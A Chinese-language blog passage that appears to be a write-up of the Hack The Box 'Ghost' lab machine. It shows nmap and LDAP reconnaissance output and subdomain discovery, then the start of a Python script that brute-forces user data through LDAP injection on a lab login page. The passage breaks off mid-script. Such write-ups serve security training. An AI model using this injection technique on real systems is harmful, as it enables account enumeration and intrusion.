href="/tags/pre2k/" rel="tag">pre2k</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/psexec/" rel="tag">psexec</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pswa/" rel="tag">pswa</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pth/" rel="tag">pth</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pyjail/" rel="tag">pyjail</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/rbcd/" rel="tag">rbcd</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/reg/" rel="tag">reg</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/remote-potato/" rel="tag">remote-potato</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/reverse/" rel="tag">reverse</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/rootkit/" rel="tag">rootkit</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/rosating/" rel="tag">rosating</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/rpc/" rel="tag">rpc</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/rpcclient/" rel="tag">rpcclient</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/runascs/" rel="tag">runascs</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/s3/" rel="tag">s3</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/sercerts/" rel="tag">sercerts</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/service/" rel="tag">service</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/sherlocks/" rel="tag">sherlocks</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/shm/" rel="tag">shm</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/sliver-ticketer/" rel="tag">sliver ticketer</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/smb/" rel="tag">smb</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/smb-krbrelayx/" rel="tag">smb_krbrelayx</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/smbmap/" rel="tag">smbmap</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/splunk/" rel="tag">splunk</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/spn/" rel="tag">spn</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/sqlcmd/" rel="tag">sqlcmd</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/sqli/" rel="tag">sqli</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/sssd/" rel="tag">sssd</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ssti/" rel="tag">ssti</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/study/" rel="tag">study</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/svn/" rel="tag">svn</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/symlink/" rel="tag">symlink</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/sysctl/" rel="tag">sysctl</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/teampass/" rel="tag">teampass</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/tgt/" rel="tag">tgt</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/username-anarchy/" rel="tag">username-anarchy</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/wapt/" rel="tag">wapt</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/websocket/" rel="tag">websocket</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/winlogon/" rel="tag">winlogon</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ysoserial-net/" rel="tag">ysoserial.net</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/zip/" rel="tag">zip</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/%E5%AE%9E%E4%BE%8B%E8%AE%B0%E5%BD%95/" rel="tag">实例记录</a></li></ul>
    </div>
  </div>


  
  <div class="sticky">
    
      
  <div class="widget-wrap">
    <div class="widget">
      <h3 class="widget-title">Recent Posts</h3>
      <ul>
        
          <a class="recent-link" href="/2025/09/02/box-wp-Guardian/" title="【season-8】 htb Guardian wp" >
            <div class="recent-link-text">
              【season-8】 htb Guardian wp
            </div>
          </a>
        
          <a class="recent-link" href="/2025/08/29/wiz-2025-cloudsecuritychampionship-3/" title="【Wiz 2025】Breaking The Barriers" >
            <div class="recent-link-text">
              【Wiz 2025】Breaking The Barriers
            </div>
          </a>
        
          <a class="recent-link" href="/2025/08/11/wiz-2025-cloudsecuritychampionship-2/" title="【Wiz 2025】Contain Me If You Can" >
            <div class="recent-link-text">
              【Wiz 2025】Contain Me If You Can
            </div>
          </a>
        
          <a class="recent-link" href="/2025/07/14/htb-wp-Outbound/" title="【season-8】 htb Outbound wp" >
            <div class="recent-link-text">
              【season-8】 htb Outbound wp
            </div>
          </a>
        
          <a class="recent-link" href="/2025/07/11/Tracks-AD-Coder/" title="Tracks-AD-Coder" >
            <div class="recent-link-text">
              Tracks-AD-Coder
            </div>
          </a>
        
      </ul>
    </div>
  </div>

    
  </div> 
</sidebar>


    </div>
    
    <div id="toc" class="widget-wrap">
      <button class="toc-toggle" onclick="toggleTOC()">
    <span class="toc-toggle-icon">
        <i class="fa fa-angle-down" aria-hidden="true" style="border-radius: 50%; padding: 5px; border: 1px solid var(--link);"></i>
    </span>
</button>
<div id="tocContainer" style="display: block;">
    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap"><span class="toc-number">1.</span> <span class="toc-text">Nmap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ldap"><span class="toc-number">2.</span> <span class="toc-text">ldap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#domain"><span class="toc-number">3.</span> <span class="toc-text">domain</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#User"><span class="toc-number"></span> <span class="toc-text">User</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#core-ghost-htb-and-ghost-htb-8008"><span class="toc-number"></span> <span class="toc-text">core.ghost.htb and ghost.htb 8008</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#intranet-ghost-htb-8008"><span class="toc-number"></span> <span class="toc-text">intranet.ghost.htb 8008</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ghost-htb-8443"><span class="toc-number">1.</span> <span class="toc-text">ghost.htb:8443</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Root"><span class="toc-number"></span> <span class="toc-text">Root</span></a>
</div>
<script>
    function toggleTOC() {
        const tocContainer = document.getElementById('tocContainer');
        tocContainer.style.display = tocContainer.style.display === 'none' ? 'block' : 'none';
        const toggleIcon = document.querySelector('.toc-toggle-icon i');
        toggleIcon.classList.toggle('fa-angle-down');
        toggleIcon.classList.toggle('fa-angle-up');
    }
</script>
<style>
    .toc-toggle {
        position: relative;
        display: inline-block;
        padding: 2% 2% 2%;
        border: none;
        border-radius: 100%;
        background-color: var(--link);
        cursor: pointer;
        transition: all 0.1s ease;
        box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
        /* position: absolute; */
        top: 0;
        right: 0;
        z-index: 10;
    }

    .toc-toggle:hover {
        background-color: var(--selection-bg);
        transform: scale(1.1);
    }

    .toc-toggle-icon {
        display: inline-block;
        vertical-align: middle;
    }

    .toc-toggle-icon i {
        display: inline-block;
        border-radius: 50%; /* Ensures the icon itself is a perfect circle */
    }

    /* #tocContainer {
        display: block;
        margin-top: 10px;
    } */
    #tocContainer {
    position: relative;
    padding-top: 10px; /* 留出按钮位置 */
}
</style>


    </div>
    
    <div id="content-body">
       


<article id="post-box-Ghost-wp" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
    
<div class="article-gallery">
  <div class="article-gallery-photos">
    
      <a class="article-gallery-img" rel="gallery_cmbjpszra002nq8kyhhbx4nvz">
        <img src="/wpimages/2024/Ghost/background.png" itemprop="image">
      </a>
    
  </div>
</div>

   
  <div class="article-inner">
    <div class="article-main">
      <header class="article-header">
        
<div class="main-title-bar">
  <div class="main-title-dot"></div>
  
    
      <h1 class="p-name article-title" itemprop="headline name">
        【season-5】box Ghost wp
      </h1>
    
  
</div>

        <div class='meta-info-bar'>
          <div class="meta-info">
  <time class="dt-published" datetime="2024-07-20T08:59:40.000Z" itemprop="datePublished">2024-07-20</time>
</div>
          <div class="need-seperator meta-info">
            <div class="meta-cate-flex">
  
  <a class="meta-cate-link" href="/categories/htb-Season-5/">htb-Season-5</a>
   
</div>
  
          </div>
          <div class="wordcount need-seperator meta-info">
            37k words 
          </div>
        </div>
        
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

      </header>
      <div class="e-content article-entry" itemprop="articleBody">
        
          <h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">PORT      STATE SERVICE       VERSION</span><br><span class="line">53/tcp    open  domain        Simple DNS Plus</span><br><span class="line">80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-07-15 07:09:48Z)</span><br><span class="line">135/tcp   open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: ghost.htb0., Site: Default-First-Site-Name)</span><br><span class="line">443/tcp   open  https?</span><br><span class="line">445/tcp   open  microsoft-ds?</span><br><span class="line">464/tcp   open  kpasswd5?</span><br><span class="line">593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: ghost.htb0., Site: Default-First-Site-Name)</span><br><span class="line">1433/tcp  open  ms-sql-s      Microsoft SQL Server</span><br><span class="line">2179/tcp  open  vmrdp?</span><br><span class="line">3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: ghost.htb0., Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: ghost.htb0., Site: Default-First-Site-Name)</span><br><span class="line">3389/tcp  open  ms-wbt-server Microsoft Terminal Services</span><br><span class="line">5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">8008/tcp  open  http          nginx 1.18.0 (Ubuntu)</span><br><span class="line">8443/tcp  open  ssl/http      nginx 1.18.0 (Ubuntu)</span><br><span class="line">9389/tcp  open  mc-nmf        .NET Message Framing</span><br><span class="line">49443/tcp open  unknown</span><br><span class="line">49664/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49669/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49671/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">58729/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">58781/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">59211/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span><br><span class="line">SF-Port1433-TCP:V=7.94SVN%I=7%D=7/15%Time=6694CB42%P=x86_64-pc-linux-gnu%r</span><br><span class="line">SF:(ms-sql-s,25,<span class="string">&quot;\x04\x01\0%\0\0\x01\0\0\0\x15\0\x06\x01\0\x1b\0\x01\x02\0</span></span><br><span class="line"><span class="string">SF:\x1c\0\x01\x03\0\x1d\0\0\xff\x10\0\x03\xe8\0\0\0\0&quot;</span>);</span><br><span class="line">Service Info: Host: DC01; OSs: Windows, Linux; CPE: cpe:/o:microsoft:windows, cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 79.88 seconds</span><br></pre></td></tr></table></figure>

<h3 id="ldap"><a href="#ldap" class="headerlink" title="ldap"></a>ldap</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line">└─$ ldapsearch -x -H ldap://10.129.197.53 -s base </span><br><span class="line"># extended LDIF</span><br><span class="line">#</span><br><span class="line"># LDAPv3</span><br><span class="line"># base &lt;&gt; (default) with scope baseObject</span><br><span class="line"># filter: (objectclass=*)</span><br><span class="line"># requesting: ALL</span><br><span class="line">#</span><br><span class="line"></span><br><span class="line">#</span><br><span class="line">dn:</span><br><span class="line">domainFunctionality: 7</span><br><span class="line">forestFunctionality: 7</span><br><span class="line">domainControllerFunctionality: 7</span><br><span class="line">rootDomainNamingContext: DC=ghost,DC=htb</span><br><span class="line">ldapServiceName: ghost.htb:dc01$@GHOST.HTB</span><br><span class="line">isGlobalCatalogReady: TRUE</span><br><span class="line">supportedSASLMechanisms: GSSAPI</span><br><span class="line">supportedSASLMechanisms: GSS-SPNEGO</span><br><span class="line">supportedSASLMechanisms: EXTERNAL</span><br><span class="line">supportedSASLMechanisms: DIGEST-MD5</span><br><span class="line">supportedLDAPVersion: 3</span><br><span class="line">supportedLDAPVersion: 2</span><br><span class="line">supportedLDAPPolicies: MaxPoolThreads</span><br><span class="line">supportedLDAPPolicies: MaxPercentDirSyncRequests</span><br><span class="line">supportedLDAPPolicies: MaxDatagramRecv</span><br><span class="line">supportedLDAPPolicies: MaxReceiveBuffer</span><br><span class="line">supportedLDAPPolicies: InitRecvTimeout</span><br><span class="line">supportedLDAPPolicies: MaxConnections</span><br><span class="line">supportedLDAPPolicies: MaxConnIdleTime</span><br><span class="line">supportedLDAPPolicies: MaxPageSize</span><br><span class="line">supportedLDAPPolicies: MaxBatchReturnMessages</span><br><span class="line">supportedLDAPPolicies: MaxQueryDuration</span><br><span class="line">supportedLDAPPolicies: MaxDirSyncDuration</span><br><span class="line">supportedLDAPPolicies: MaxTempTableSize</span><br><span class="line">supportedLDAPPolicies: MaxResultSetSize</span><br><span class="line">supportedLDAPPolicies: MinResultSets</span><br><span class="line">supportedLDAPPolicies: MaxResultSetsPerConn</span><br><span class="line">supportedLDAPPolicies: MaxNotificationPerConn</span><br><span class="line">supportedLDAPPolicies: MaxValRange</span><br><span class="line">supportedLDAPPolicies: MaxValRangeTransitive</span><br><span class="line">supportedLDAPPolicies: ThreadMemoryLimit</span><br><span class="line">supportedLDAPPolicies: SystemMemoryLimitPercent</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.319</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.801</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.473</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.528</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.417</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.619</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.841</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.529</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.805</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.521</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.970</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.1338</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.474</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.1339</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.1340</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.1413</span><br><span class="line">supportedControl: 2.16.840.1.113730.3.4.9</span><br><span class="line">supportedControl: 2.16.840.1.113730.3.4.10</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.1504</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.1852</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.802</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.1907</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.1948</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.1974</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.1341</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.2026</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.2064</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.2065</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.2066</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.2090</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.2205</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.2204</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.2206</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.2211</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.2239</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.2255</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.2256</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.2309</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.2330</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.2354</span><br><span class="line">supportedCapabilities: 1.2.840.113556.1.4.800</span><br><span class="line">supportedCapabilities: 1.2.840.113556.1.4.1670</span><br><span class="line">supportedCapabilities: 1.2.840.113556.1.4.1791</span><br><span class="line">supportedCapabilities: 1.2.840.113556.1.4.1935</span><br><span class="line">supportedCapabilities: 1.2.840.113556.1.4.2080</span><br><span class="line">supportedCapabilities: 1.2.840.113556.1.4.2237</span><br><span class="line">subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=ghost,DC=htb</span><br><span class="line">serverName: CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configur</span><br><span class="line"> ation,DC=ghost,DC=htb</span><br><span class="line">schemaNamingContext: CN=Schema,CN=Configuration,DC=ghost,DC=htb</span><br><span class="line">namingContexts: DC=ghost,DC=htb</span><br><span class="line">namingContexts: CN=Configuration,DC=ghost,DC=htb</span><br><span class="line">namingContexts: CN=Schema,CN=Configuration,DC=ghost,DC=htb</span><br><span class="line">namingContexts: DC=DomainDnsZones,DC=ghost,DC=htb</span><br><span class="line">namingContexts: DC=ForestDnsZones,DC=ghost,DC=htb</span><br><span class="line">isSynchronized: TRUE</span><br><span class="line">highestCommittedUSN: 152657</span><br><span class="line">dsServiceName: CN=NTDS Settings,CN=DC01,CN=Servers,CN=Default-First-Site-Name,</span><br><span class="line"> CN=Sites,CN=Configuration,DC=ghost,DC=htb</span><br><span class="line">dnsHostName: DC01.ghost.htb</span><br><span class="line">defaultNamingContext: DC=ghost,DC=htb</span><br><span class="line">currentTime: 20240715064305.0Z</span><br><span class="line">configurationNamingContext: CN=Configuration,DC=ghost,DC=htb</span><br><span class="line"></span><br><span class="line"># search result</span><br><span class="line">search: 2</span><br><span class="line">result: 0 Success</span><br><span class="line"></span><br><span class="line"># numResponses: 2</span><br><span class="line"># numEntries: 1</span><br></pre></td></tr></table></figure>


<h3 id="domain"><a href="#domain" class="headerlink" title="domain"></a>domain</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Found: intranet.ghost.htb</span><br><span class="line">                                                        </span><br><span class="line">Found: corp.ghost.htb</span><br><span class="line">                                                            </span><br><span class="line">Found: core.ghost.htb</span><br><span class="line">                                                       </span><br><span class="line">Found: federation.ghost.htb</span><br><span class="line"></span><br><span class="line">Found: gitea.ghost.htb:8008	</span><br></pre></td></tr></table></figure>

<p>smb和mssql也试过了没有匿名</p>
<h2 id="User"><a href="#User" class="headerlink" title="User"></a>User</h2><p>因为域名比较多，所以80、8008和8443排着测试域名。</p>
<h2 id="core-ghost-htb-and-ghost-htb-8008"><a href="#core-ghost-htb-and-ghost-htb-8008" class="headerlink" title="core.ghost.htb and ghost.htb 8008"></a>core.ghost.htb and ghost.htb 8008</h2><p>在<code>http://core.ghost.htb:8008/</code>web点点有看到一个用户发帖子</p>
<p><img src="/wpimages/2024/Ghost/web1.jpg" alt="web1"></p>
<p>点进去看一下会看到一个用户名路径，先记录一下这个用户名</p>
<p><img src="/wpimages/2024/Ghost/web2.jpg" alt="web2"></p>
<p>然后再好像没有什么了，到处点一下再。</p>
<p>然后点击搜索的时候出来一个api路径，不过没看出有啥用来，也先记录一下</p>
<p><img src="/wpimages/2024/Ghost/web3.jpg" alt="web3"></p>
<p>奇怪的是我过了一会再回来点这个搜索就不好使了，不知道为什么。</p>
<p>看了下这是个成品的cms</p>
<p><img src="/wpimages/2024/Ghost/web4.jpg" alt="web4"></p>
<p>去找了下相关搭建的东西，发现这个cms有个后台</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://help.aliyun.com/zh/ecs/use-cases/build-a-ghost-blogging-website-on-an-instance-that-runs-ubuntu">https://help.aliyun.com/zh/ecs/use-cases/build-a-ghost-blogging-website-on-an-instance-that-runs-ubuntu</a></p>
</blockquote>
<p>只需要在后面加个<code>/ghost</code>便是，我一开始对这个站点做目录爆破时候没有出来这个。</p>
<p>然后发现他这个web这里好像可以尝试爆破用户。</p>
<p><img src="/wpimages/2024/Ghost/web5.jpg" alt="web5"></p>
<p>然后尝试跑了一下，发现有爆破限制，就放弃了。</p>
<p>再尝试其他域名</p>
<h2 id="intranet-ghost-htb-8008"><a href="#intranet-ghost-htb-8008" class="headerlink" title="intranet.ghost.htb 8008"></a>intranet.ghost.htb 8008</h2><p>发现也是一个登录页面，但是看着像是自己写的</p>
<p><img src="/wpimages/2024/Ghost/web6.jpg" alt="web6"></p>
<p>这里看到next.js我想到的是最近的那个ssrf..不过那个着实挺鸡肋的</p>
<p>简单试一下sql注入</p>
<p>然后我在这注的时候发现他好传参咋是个ldap</p>
<p><img src="/wpimages/2024/Ghost/web7.jpg" alt="web7"></p>
<p>用现有用户名测了一下，有跳转反应</p>
<p><img src="/wpimages/2024/Ghost/web8.jpg" alt="web8"></p>
<p>这里果断写了个脚本尝试爆破用户全称，因为我直接给了<code>Kathryn Holland</code>和<code>Kathryn</code>他都报错</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ThreadPoolExecutor</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s = string.ascii_lowercase+string.punctuation</span><br><span class="line">url = <span class="string">&#x27;http://intranet.ghost.htb:8008/login&#x27;</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;intranet.ghost.htb:8008&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/x-component&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;en-US,en;q=0.5&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Next-Action&#x27;</span>: <span class="string">&#x27;c471eb076ccac91d6f828b671795550fd5925940&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;multipart/form-data; boundary=---------------------------3346689174189000912473093233&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">lock = threading.Lock()</span><br><span class="line">test = <span class="string">&quot;&quot;</span></span><br><span class="line">passwd = <span class="literal">False</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test_char</span>(<span class="params">head,char</span>):</span><br><span class="line">    <span class="keyword">global</span> test</span><br><span class="line">    <span class="keyword">global</span> passwd</span><br><span class="line">    <span 